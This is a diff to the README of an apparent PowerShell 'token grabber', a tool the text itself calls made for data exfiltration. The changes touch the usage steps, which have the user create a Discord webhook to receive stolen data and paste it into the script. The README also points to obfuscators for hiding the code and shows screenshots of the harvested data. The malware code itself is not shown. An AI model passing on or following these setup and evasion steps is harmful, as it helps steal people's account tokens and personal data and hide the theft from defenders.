@@ -23,7 +23,8 @@ This tool is made for data exfiltration. All information collected is sent using
 
 # Usage
 - Create a Webhook on your [Discord Server](https://discord.com). I recommend creating a new server.
-- Replace YOUR_WEBHOOK_HERE in [line 6](https://github.com/Chainski/Powershell-Token-Grabber/blob/main/main.ps1#L6) with your webhook.
+- Replace ```YOUR_WEBHOOK_HERE``` in [line 6](https://github.com/Chainski/Powershell-Token-Grabber/blob/main/main.ps1#L6) with your webhook.
+https://github.com/Chainski/PowerShell-Token-Grabber/blob/5c7f9f982fab344f308963072806075569b8da37/main.ps1#L6
 
 # Want to obfuscate the code ?
 Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). \
@@ -36,6 +37,8 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 
  ### Webhook Data
 > ![screenshot](https://user-images.githubusercontent.com/96607632/236490140-201f4987-3569-4542-a769-41cf09574f2d.png)
+> ![more data](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/222b7baf-13f3-4db0-bc70-7582bf3d6e36)
+
 
 #  Features
 - [x] GUI Builder
